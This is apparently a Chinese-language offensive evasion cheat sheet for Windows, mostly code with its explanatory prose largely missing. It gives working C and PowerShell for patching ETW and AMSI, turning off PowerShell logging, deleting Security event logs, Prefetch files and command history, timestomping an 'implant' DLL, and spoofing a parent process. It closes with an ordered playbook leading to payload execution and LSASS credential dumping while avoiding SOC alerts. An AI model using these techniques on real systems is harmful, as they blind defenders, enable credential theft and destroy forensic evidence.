

|--------------|------|--------|


|-----|-----|------|


```text
应用代码 EventWrite(...)
  → 微软封装 (TraceLogging API)
  → ntdll!EtwEventWrite[Full|Ex]
  → ntdll!NtTraceEvent (syscall)
  → nt!NtTraceEvent (内核)
  → 内核 ETW core → 消费端（EDR 用户态进程订阅 session）
```


```text
原始：
  4C 8B DC                 mov r11, rsp
  48 81 EC 88 00 00 00     sub rsp, 88h
  ...

patch 后（x64）：
  33 C0                    xor eax, eax       ; STATUS_SUCCESS = 0
  C3                       ret
```


```c
#include <windows.h>

BOOL PatchEtwEventWrite(void) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return FALSE;

    FARPROC pEtw = GetProcAddress(hNtdll, "EtwEventWrite");
    if (!pEtw) return FALSE;

    BYTE patch[] = { 0x33, 0xC0, 0xC3 };   // xor eax,eax; ret
    DWORD oldProt = 0;

    // 注意：VirtualProtect 自身可能被 hook -> 用 indirect syscall 版本
    if (!VirtualProtect(pEtw, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProt))
        return FALSE;

    memcpy(pEtw, patch, sizeof(patch));

    VirtualProtect(pEtw, sizeof(patch), oldProt, &oldProt);
    return TRUE;
}
```


```c
// EtwEventEnabled 通常返回 BOOLEAN (1 byte)
BYTE patch[] = { 0x32, 0xC0, 0xC3 };   // xor al,al; ret
```


```c
// NtTraceControl(EtwpStopTrace, ...)
// 需要 SeSystemProfilePrivilege 或更高
// 适用于 Local Admin + UAC bypass 后
```


```text
nt!EtwpEventTracingProviderEnableInfo
nt!EtwThreatIntProvRegHandle
直接置 0 让所有 ETW-TI 事件被丢弃
```


## 3. AMSI Bypass


```c
// amsi.dll!AmsiScanBuffer 入口写：
//   mov eax, 0x80070057     ; E_INVALIDARG
//   ret 4                    ; (32位) 或 ret (64位)

BOOL PatchAmsi(void) {
    HMODULE h = LoadLibraryA("amsi.dll");
    if (!h) return FALSE;
    FARPROC p = GetProcAddress(h, "AmsiScanBuffer");
    if (!p) return FALSE;

    BYTE patch64[] = {
        0xB8, 0x57, 0x00, 0x07, 0x80,   // mov eax, 0x80070057
        0xC3                              // ret
    };
    DWORD old = 0;
    VirtualProtect(p, sizeof(patch64), PAGE_EXECUTE_READWRITE, &old);
    memcpy(p, patch64, sizeof(patch64));
    VirtualProtect(p, sizeof(patch64), old, &old);
    return TRUE;
}
```


```powershell
# 概念演示——真实环境必须配合混淆 / HWBP
[Ref].Assembly.GetType('System.Management.Automation.'+$([char]65+'msi'+'Utils')).GetField($([char]97+'msiInitFailed'),'NonPublic,Static').SetValue($null,$true)
```


1. AddVectoredExceptionHandler
4. ContinueExecution


```text
// AmsiContext 头部应该是 "AMSI" 魔数
// 改成 "XXXX" → AmsiScanBuffer 内部校验失败但返回 S_OK + AMSI_RESULT_CLEAN
```


```powershell
# 注册表（需管理员）
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging' `
    -Name 'EnableScriptBlockLogging' -Value 0 -Force

Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging' `
    -Name 'EnableModuleLogging' -Value 0 -Force

Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription' `
    -Name 'EnableTranscripting' -Value 0 -Force

# Group Policy 路径：
# Computer Configuration → Administrative Templates → Windows Components →
#   Windows PowerShell → Turn on PowerShell Script Block Logging = Disabled
```


```powershell
# 当前会话
Clear-History
# 持久化 history (PSReadLine)
Remove-Item (Get-PSReadLineOption).HistorySavePath -Force -ErrorAction SilentlyContinue
```


```powershell
# 需要 SYSTEM
Remove-Item 'C:\Windows\Prefetch\implant*.pf' -Force
# 整体清空（动作大，慎用）
# Remove-Item 'C:\Windows\Prefetch\*.pf' -Force
```


```powershell
# 停 session 后删 etl
logman stop "EventLog-Security" -ets
Remove-Item 'C:\Windows\System32\winevt\Logs\Security.evtx' -Force -ErrorAction SilentlyContinue
# 注意：直接删 .evtx 会被 Event Log Service 重新创建并写入 "log cleared" 事件 (Event ID 1102)
# 更隐蔽：内存中 patch wevtsvc.dll 的 EventLog API（属于 T1070.001）
```


```powershell
$f = 'C:\Windows\Temp\implant.dll'
$ref = 'C:\Windows\System32\notepad.exe'
(Get-Item $f).CreationTime   = (Get-Item $ref).CreationTime
(Get-Item $f).LastWriteTime  = (Get-Item $ref).LastWriteTime
(Get-Item $f).LastAccessTime = (Get-Item $ref).LastAccessTime
```


|----------|------|
| 8 | CreateRemoteThread |
| 10 | ProcessAccess（OpenProcess） |
| 11 | FileCreate |
| 22 | DNS Query |
| 25 | ProcessTampering（image hollowing） |


```c
STARTUPINFOEX si = {0};
PROCESS_INFORMATION pi = {0};
SIZE_T size = 0;
HANDLE hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, g_explorerPid);

si.StartupInfo.cb = sizeof(STARTUPINFOEX);
InitializeProcThreadAttributeList(NULL, 1, 0, &size);
si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, size);
InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size);
UpdateProcThreadAttribute(si.lpAttributeList, 0,
    PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParent, sizeof(HANDLE), NULL, NULL);

CreateProcessW(L"C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE,
    EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi);
```


```text
1. AMSI bypass (HWBP 优先，避免写 amsi.dll)
   ─── 让 .NET / PowerShell 装载 implant 时不被扫
2. ETW patch (先 patch EtwEventWrite，再做任何 syscall)
   ─── 关掉自身后续动作的遥测
3. NtProtectVirtualMemory 用 indirect syscall 调用
   ─── 准备好"安全的"内存权限切换通道
4. Unhook ntdll (Peruns Fart) 或 enable indirect syscall
   ─── 抹掉用户态 hook
5. Call stack spoof setup
   ─── 准备好之后所有 syscall 的伪栈
6. 实际 payload 执行 (注入 / 横向 / dump LSASS)
7. 清痕迹 (PowerShell history / Prefetch / 时间戳)
```


```text
❌ 先 unhook ntdll → ETW-TI 立即上报 PROTECTVM + module modification → SOC 已经收到告警
❌ 先 dump LSASS → AMSI / ETW 都还没压 → 高置信 T1003.001 告警
✅ AMSI → ETW → unhook → spoof → payload
```


- ETW Threat Intelligence Provider：<https://learn.microsoft.com/en-us/windows/win32/etw/event-tracing-portal>
- PPID Spoofing：<https://blog.didierstevens.com/2017/03/20/>
- Ekko sleep mask：<https://github.com/Cracked5pider/Ekko>
- Foliage sleep obfuscation：<https://github.com/SecIdiot/FOLIAGE>
- MITRE T1562.002 (Disable Windows Event Logging)：<https://attack.mitre.org/techniques/T1562/002/>
- MITRE T1562.006 (Indicator Blocking)：<https://attack.mitre.org/techniques/T1562/006/>
- MITRE T1070 (Indicator Removal)：<https://attack.mitre.org/techniques/T1070/>
